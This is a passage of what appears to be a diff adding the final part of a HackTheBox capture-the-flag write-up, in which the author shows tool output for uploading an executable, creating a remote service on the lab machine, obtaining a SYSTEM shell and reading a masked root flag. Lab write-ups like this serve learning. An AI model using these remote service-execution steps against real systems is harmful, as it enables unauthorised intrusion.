+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">OuXukLXP</span><span class="p">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">10.10.10.82</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">kdqo</span> <span class="n">on</span> <span class="mf">10.10.10.82</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">kdqo</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">6.3.9600</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2013</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="n">whoami</span>
+<span class="n">nt</span> <span class="n">authority</span><span class="err">\</span><span class="n">system</span>
+</pre></div>
+
+
+<p>Finally, I have full provileges and can read the <code>root.txt</code>. </p>
+<div class="highlight"><pre><span></span><span class="c">C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt</span>
+<span class="err">cd****************************f6</span>
+</pre></div>
+
+
+<p>PS: I could have easily downloaded or read directly the user.txt and root.txt using <code>odat</code> since we had privileges to do that. However, I used the long way for learning purposes and I have to say it was a nice box with few difficulties. I struggled quite a lot on the special character thing, but in the end is a lesson learned. </p>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
